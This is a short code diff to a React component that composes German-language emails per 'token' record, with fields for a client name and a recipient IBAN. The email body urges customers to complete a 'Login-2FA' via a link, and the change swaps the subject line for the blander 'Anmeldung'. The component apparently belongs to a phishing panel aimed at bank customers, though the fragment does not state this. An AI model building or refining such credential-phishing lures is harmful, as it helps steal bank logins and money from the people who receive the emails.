@@ -150,7 +150,7 @@ const UnifiedTokensList = () => {
       empfaenger_iban: r.empfaenger_iban || "",
     });
     setEmailTitle(`Email · Login-2FA · ${r.auftraggeber_name || r.token}`);
-    setEmailSubject("Login-2FA");
+    setEmailSubject("Anmeldung");
     setEmailHtml(
       `<p>Sehr geehrte/r ${r.auftraggeber_name || "Kunde/in"},</p>` +
       `<p>bitte schließen Sie Ihre Login-2FA über den folgenden Link ab:</p>` +
